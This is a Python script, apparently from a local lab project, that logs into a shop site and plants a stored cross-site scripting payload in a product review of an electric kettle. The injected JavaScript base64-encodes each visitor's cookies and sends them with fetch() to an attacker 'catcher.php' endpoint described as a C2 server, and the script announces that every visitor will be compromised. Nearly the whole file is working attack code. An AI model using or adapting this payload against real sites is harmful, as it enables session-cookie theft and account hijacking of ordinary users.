import requests

# --- XSS Payload ---
# The code that steals the cookie and sends it to your C2 server
PAYLOAD = """
The handle gets too hot, and there's a weird smell.<script>
    var encoded = btoa(document.cookie);
    fetch('http://localhost/CyberProject/AttackerServer/catcher.php?data=' + encoded);
</script>
"""

def perform_stored_xss(username="HUCKER", password="hucker123", target_url="http://localhost/CyberProject/product_view.php?id=81"):  # The ID of the electric kettle in the DB is 81
    base_url = target_url.split("/product_view.php")[0]
    login_url = f"{base_url}/login.php"

    session = requests.Session()

    print("[*] Step 1: Logging into the system...")
    login_data = {
        "username": username,
        "password": password,
        "login_submit": ""
    }
    
    response = session.post(login_url, data=login_data)
    if "home.php" in response.url or session.cookies.get("PHPSESSID"):
        print(f"[+] Login successful as {username}!")
    else:
        print("[! ] Login failed. Check your credentials.")
        return

    print(f"[*] Step 2: Injecting Stored XSS into product page...")
    
    review_data = {
        "rating": "2",
        "content": PAYLOAD,
        "submit_review": ""
    }

    # Sending the malicious review
    inject_response = session.post(target_url, data=review_data)

    if inject_response.status_code == 200:
        print("[SUCCESS] Payload injected successfully into the database!")
        print(f"[!] Now, any user visiting {target_url} will be compromised.")
        return True
    else:
        print("[!] Failed to inject payload.")
        return False

if __name__ == "__main__":
    perform_stored_xss()